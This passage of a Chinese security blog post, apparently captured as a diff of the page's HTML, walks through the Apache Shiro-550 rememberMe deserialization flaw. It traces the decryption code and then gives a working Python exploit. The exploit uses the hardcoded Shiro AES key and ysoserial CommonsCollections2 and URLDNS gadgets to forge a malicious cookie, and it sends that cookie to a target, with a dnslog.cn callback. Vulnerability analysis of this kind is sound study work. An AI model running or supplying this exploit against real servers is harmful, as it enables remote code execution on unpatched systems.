+                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">CryptoException</span><span class="token punctuation">(</span>msg<span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+        <span class="token punctuation">}</span>
+<span class="token comment">//进入下一层解密，跟进</span>
+        <span class="token keyword">return</span> <span class="token function">decrypt</span><span class="token punctuation">(</span>encrypted<span class="token punctuation">,</span> key<span class="token punctuation">,</span> iv<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>跟进crypt方法</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token class-name">ByteSource</span> <span class="token function">decrypt</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> ciphertext<span class="token punctuation">,</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> key<span class="token punctuation">,</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> iv<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">CryptoException</span> <span class="token punctuation">{</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>log<span class="token punctuation">.</span><span class="token function">isTraceEnabled</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            log<span class="token punctuation">.</span><span class="token function">trace</span><span class="token punctuation">(</span><span class="token string">"Attempting to decrypt incoming byte array of length "</span> <span class="token operator">+</span>
+                    <span class="token punctuation">(</span>ciphertext <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">?</span> ciphertext<span class="token punctuation">.</span>length <span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> decrypted <span class="token operator">=</span> <span class="token function">crypt</span><span class="token punctuation">(</span>ciphertext<span class="token punctuation">,</span> key<span class="token punctuation">,</span> iv<span class="token punctuation">,</span> <span class="token class-name"><span class="token namespace">javax<span class="token punctuation">.</span>crypto<span class="token punctuation">.</span></span>Cipher</span><span class="token punctuation">.</span><span class="token constant">DECRYPT_MODE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span> decrypted <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">?</span> <span class="token keyword">null</span> <span class="token operator">:</span> <span class="token class-name">ByteSource<span class="token punctuation">.</span>Util</span><span class="token punctuation">.</span><span class="token function">bytes</span><span class="token punctuation">(</span>decrypted<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>解密完成</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">crypt</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes<span class="token punctuation">,</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> key<span class="token punctuation">,</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> iv<span class="token punctuation">,</span> <span class="token keyword">int</span> mode<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IllegalArgumentException</span><span class="token punctuation">,</span> <span class="token class-name">CryptoException</span> <span class="token punctuation">{</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>key <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> key<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">IllegalArgumentException</span><span class="token punctuation">(</span><span class="token string">"key argument cannot be null or empty."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        <span class="token class-name"><span class="token namespace">javax<span class="token punctuation">.</span>crypto<span class="token punctuation">.</span></span>Cipher</span> cipher <span class="token operator">=</span> <span class="token function">initNewCipher</span><span class="token punctuation">(</span>mode<span class="token punctuation">,</span> key<span class="token punctuation">,</span> iv<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span> <span class="token function">crypt</span><span class="token punctuation">(</span>cipher<span class="token punctuation">,</span> bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>一步步返回到AbstractRememberMeManager的decrypt方法：</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">protected</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">decrypt</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> encrypted<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> serialized <span class="token operator">=</span> encrypted<span class="token punctuation">;</span>
+        <span class="token class-name">CipherService</span> cipherService <span class="token operator">=</span> <span class="token function">getCipherService</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>cipherService <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token class-name">ByteSource</span> byteSource <span class="token operator">=</span> cipherService<span class="token punctuation">.</span><span class="token function">decrypt</span><span class="token punctuation">(</span>encrypted<span class="token punctuation">,</span> <span class="token function">getDecryptionCipherKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            serialized <span class="token operator">=</span> byteSource<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        <span class="token keyword">return</span> serialized<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>return，看到deserialize方法：</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">protected</span> <span class="token class-name">PrincipalCollection</span> <span class="token function">convertBytesToPrincipals</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes<span class="token punctuation">,</span> <span class="token class-name">SubjectContext</span> subjectContext<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">getCipherService</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            bytes <span class="token operator">=</span> <span class="token function">decrypt</span><span class="token punctuation">(</span>bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        <span class="token keyword">return</span> <span class="token function">deserialize</span><span class="token punctuation">(</span>bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>跟进Deserialize，找到了ReadObject方法，可以开始调用。</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">T</span> <span class="token function">deserialize</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> serialized<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">SerializationException</span> <span class="token punctuation">{</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>serialized <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token class-name">String</span> msg <span class="token operator">=</span> <span class="token string">"argument cannot be null."</span><span class="token punctuation">;</span>
+            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">IllegalArgumentException</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        <span class="token class-name">ByteArrayInputStream</span> bais <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>serialized<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">BufferedInputStream</span> bis <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BufferedInputStream</span><span class="token punctuation">(</span>bais<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">try</span> <span class="token punctuation">{</span>
+            <span class="token class-name">ObjectInputStream</span> ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ClassResolvingObjectInputStream</span><span class="token punctuation">(</span>bis<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token annotation punctuation">@SuppressWarnings</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"unchecked"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
+            <span class="token class-name">T</span> deserialized <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">)</span> ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            ois<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">return</span> deserialized<span class="token punctuation">;</span>
+        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token class-name">String</span> msg <span class="token operator">=</span> <span class="token string">"Unable to deserialze argument byte array."</span><span class="token punctuation">;</span>
+            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">SerializationException</span><span class="token punctuation">(</span>msg<span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="0x4-exp编写"><a href="#0x4-exp编写" class="headerlink" title="0x4 exp编写"></a>0x4 exp编写</h2><h2 id="本次AES加密的一些小知识点："><a href="#本次AES加密的一些小知识点：" class="headerlink" title="本次AES加密的一些小知识点："></a><strong>本次AES加密的一些小知识点：</strong></h2><ul>
+<li>某些加密算法要求明文需要按一定长度对齐，叫做块大小(BlockSize)，我们这次就是16字节，那么对于一段任意的数据，加密前需要对最后一个块填充到16 字节，解密后需要删除掉填充的数据。</li>
+<li>AES中有三种填充模式(PKCS7Padding/PKCS5Padding/ZeroPadding)</li>
+<li>PKCS7Padding跟PKCS5Padding的区别就在于数据填充方式，PKCS7Padding是缺几个字节就补几个字节的0，而PKCS5Padding是缺几个字节就补充几个字节的几，好比缺6个字节，就补充6个字节的6</li>
+</ul>
+<p>加密流程就是：</p>
+<ul>
+<li>使用的 AES/CBC/PKCS5Padding 模式</li>
+<li>random = this.ensureSecureRandom(); 使用随机数生成 ivBytes</li>
+<li>key为预留的那个硬编码</li>
+<li>encrypt(plaintext, key, ivBytes, generate) 生成</li>
+<li>最后base64加密，放入cookie中</li>
+</ul>
+<p>解密流程可以知道：</p>
+<ul>
+<li>使用的 AES/CBC/PKCS5Padding 模式 ，所以Key要求是为16位的，key为预留的那个硬编码</li>
+<li>base64解密cookie 中 rememberMe的值</li>
+<li>根据解密 vi 是 秘文的前16位</li>
+<li>iv即为rememberMe解码后的前16个字节</li>
+<li>有了key 和 vi 就可以解密到反序列化的数据了</li>
+</ul>
+<p>那POC的我们的加密流程就是：</p>
+<ol>
+<li>获取到 反序列化的数据</li>
+<li>设置AES加密模式，使用AES.MODE_CBC的分块模式</li>
+<li>设置硬编码的 key</li>
+<li>使用随机数生成 16 字节的 iv</li>
+<li>使用 iv + AES加密(反序列化数据) 拼接</li>
+<li>最后base64加密全部内容</li>
+</ol>
+<h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a><strong>利用思路</strong></h2><p>这里主要导入的是这个版本的apache.commons</p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;groupId&gt;org.apache.commons&lt;/groupId&gt;
+&lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;
+&lt;version&gt;4.0&lt;/version&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>所以我们EXP利用CommonsCollections2 的利用链</p>
+<p>主要依靠ysoserial生成利用的反序列化数据，然后根据加密的思路，把利用链加进去。</p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token namespace">base64</span>
+<span class="token keyword">import</span> <span class="token namespace">sys</span>
+<span class="token keyword">import</span> <span class="token namespace">uuid</span>
+<span class="token keyword">import</span> <span class="token namespace">subprocess</span>
+
+<span class="token keyword">import</span> <span class="token namespace">requests</span>
+from <span class="token class-name">Crypto<span class="token punctuation">.</span>Cipher</span> <span class="token keyword">import</span> <span class="token constant">AES</span>
+
+def <span class="token function">encode_rememberme</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token operator">:</span>
+    # 这里使用<span class="token class-name">CommonsCollections2</span>模块
+    popen <span class="token operator">=</span> <span class="token class-name"><span class="token namespace">subprocess<span class="token punctuation">.</span></span>Popen</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token char">'java'</span><span class="token punctuation">,</span> <span class="token char">'-jar'</span><span class="token punctuation">,</span> 'ysoserial<span class="token punctuation">.</span>jar<span class="token char">', '</span><span class="token class-name">CommonsCollections2</span>'<span class="token punctuation">,</span> command<span class="token punctuation">]</span><span class="token punctuation">,</span> stdout<span class="token operator">=</span>subprocess<span class="token punctuation">.</span><span class="token constant">PIPE</span><span class="token punctuation">)</span>
+    # 明文需要按一定长度对齐，叫做块大小<span class="token class-name">BlockSize</span> 这个块大小是 block_size <span class="token operator">=</span> <span class="token number">16</span> 字节
+    <span class="token constant">BS</span> <span class="token operator">=</span> <span class="token constant">AES</span><span class="token punctuation">.</span>block_size
+    # 按照加密规则按一定长度对齐<span class="token punctuation">,</span>如果不够要要做填充对齐
+    pad <span class="token operator">=</span> lambda s<span class="token operator">:</span> s <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token constant">BS</span> <span class="token operator">-</span> <span class="token function">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token constant">BS</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token constant">BS</span> <span class="token operator">-</span> <span class="token function">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token constant">BS</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    # 泄露的key
+    key <span class="token operator">=</span> <span class="token string">"kPH+bIxk5D2deZiIxcaaaA=="</span>
+    # <span class="token constant">AES</span>的<span class="token constant">CBC</span>加密模式
+    mode <span class="token operator">=</span> <span class="token constant">AES</span><span class="token punctuation">.</span><span class="token constant">MODE_CBC</span>
+    # 使用uuid4基于随机数模块生成<span class="token number">16</span>字节的 iv向量
+    iv <span class="token operator">=</span> uuid<span class="token punctuation">.</span><span class="token function">uuid4</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>bytes
+    # 实例化一个加密方式为上述的对象
+    encryptor <span class="token operator">=</span> <span class="token constant">AES</span><span class="token punctuation">.</span><span class="token keyword">new</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span><span class="token function">b64decode</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">,</span> mode<span class="token punctuation">,</span> iv<span class="token punctuation">)</span>
+    # 用pad函数去处理yso的命令输出，生成的序列化数据
+    file_body <span class="token operator">=</span> <span class="token function">pad</span><span class="token punctuation">(</span>popen<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    # iv 与 （序列化的<span class="token constant">AES</span>加密后的数据）拼接， 最终输出生成rememberMe参数
+    base64_rememberMe_value <span class="token operator">=</span> base64<span class="token punctuation">.</span><span class="token function">b64encode</span><span class="token punctuation">(</span>iv <span class="token operator">+</span> encryptor<span class="token punctuation">.</span><span class="token function">encrypt</span><span class="token punctuation">(</span>file_body<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span> base64_rememberMe_value
+
+def <span class="token function">dnslog</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token operator">:</span>
+    popen <span class="token operator">=</span> <span class="token class-name"><span class="token namespace">subprocess<span class="token punctuation">.</span></span>Popen</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token char">'java'</span><span class="token punctuation">,</span> <span class="token char">'-jar'</span><span class="token punctuation">,</span> 'ysoserial<span class="token punctuation">.</span>jar<span class="token char">', '</span><span class="token constant">URLDNS</span>'<span class="token punctuation">,</span> command<span class="token punctuation">]</span><span class="token punctuation">,</span> stdout<span class="token operator">=</span>subprocess<span class="token punctuation">.</span><span class="token constant">PIPE</span><span class="token punctuation">)</span>
+    <span class="token constant">BS</span> <span class="token operator">=</span> <span class="token constant">AES</span><span class="token punctuation">.</span>block_size
+    pad <span class="token operator">=</span> lambda s<span class="token operator">:</span> s <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token constant">BS</span> <span class="token operator">-</span> <span class="token function">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token constant">BS</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token constant">BS</span> <span class="token operator">-</span> <span class="token function">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token constant">BS</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    key <span class="token operator">=</span> <span class="token string">"kPH+bIxk5D2deZiIxcaaaA=="</span>
+    mode <span class="token operator">=</span> <span class="token class-name">AES<span class="token punctuation">.</span>MODE_CBC</span>
+    iv <span class="token operator">=</span> uuid<span class="token punctuation">.</span><span class="token function">uuid4</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>bytes
+    encryptor <span class="token operator">=</span> <span class="token constant">AES</span><span class="token punctuation">.</span><span class="token keyword">new</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span><span class="token function">b64decode</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">,</span> mode<span class="token punctuation">,</span> iv<span class="token punctuation">)</span>
+    file_body <span class="token operator">=</span> <span class="token function">pad</span><span class="token punctuation">(</span>popen<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    base64_rememberMe_value <span class="token operator">=</span> base64<span class="token punctuation">.</span><span class="token function">b64encode</span><span class="token punctuation">(</span>iv <span class="token operator">+</span> encryptor<span class="token punctuation">.</span><span class="token function">encrypt</span><span class="token punctuation">(</span>file_body<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span> base64_rememberMe_value
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> '__main__'<span class="token operator">:</span>
+    # cc2的exp
+    payload <span class="token operator">=</span> <span class="token function">encode_rememberme</span><span class="token punctuation">(</span>'<span class="token operator">/</span><span class="token class-name">System</span><span class="token operator">/</span><span class="token class-name">Applications</span><span class="token operator">/</span><span class="token class-name">Calculator</span><span class="token punctuation">.</span>app<span class="token operator">/</span><span class="token class-name">Contents</span><span class="token operator">/</span><span class="token class-name">MacOS</span><span class="token operator">/</span><span class="token class-name">Calculator</span>'<span class="token punctuation">)</span>
+    <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"rememberMe={}"</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span>payload<span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    # dnslog的poc
+    payload1 <span class="token operator">=</span> <span class="token function">encode_rememberme</span><span class="token punctuation">(</span>'http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>rjnck7<span class="token punctuation">.</span>dnslog<span class="token punctuation">.</span>cn'<span class="token punctuation">)</span>
+    <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"rememberMe={}"</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span>payload1<span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    cookie <span class="token operator">=</span> <span class="token punctuation">{</span>
+        <span class="token string">"rememberMe"</span><span class="token operator">:</span> payload<span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">}</span>
+    requests<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>url<span class="token operator">=</span><span class="token string">"http://127.0.0.1:8080/web_war/"</span><span class="token punctuation">,</span> cookies<span class="token operator">=</span>cookie<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>利用CC3（commons-collections3.2.1版本）</p>
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">l1b3r</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://l1b3r.github.io/2022/10/07/shiro-550/">https://l1b3r.github.io/2022/10/07/shiro-550/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">l1b3r</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/%E5%8D%9A%E5%AE%A2/">
+                                    <span class="chip bg-color">博客</span>
+                                </a>
+                            
+                                <a href="/tags/hexo/">
+                                    <span class="chip bg-color">hexo</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="/medias/reward/wechat.jpg" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2022/10/07/cc1/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/9.jpg" class="responsive-img" alt="CC1">
+                        
+                        <span class="card-title">CC1</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2022-10-07
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="post-category">
+                                    Java代码审计
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E5%8D%9A%E5%AE%A2/">
+                        <span class="chip bg-color">博客</span>
+                    </a>
+                    
+                    <a href="/tags/hexo/">
+                        <span class="chip bg-color">hexo</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2022/10/07/evilmodel-hiding-malware-inside-of-neural-network-models/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/7.jpg" class="responsive-img" alt="EvilModel:Hiding Malware Inside of Neural Network Models">
+                        
+                        <span class="card-title">EvilModel:Hiding Malware Inside of Neural Network Models</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-10-07
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E8%AE%BA%E6%96%87/" class="post-category">
+                                    论文
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E5%8D%9A%E5%AE%A2/">
+                        <span class="chip bg-color">博客</span>
+                    </a>
+                    
+                    <a href="/tags/hexo/">
+                        <span class="chip bg-color">hexo</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+
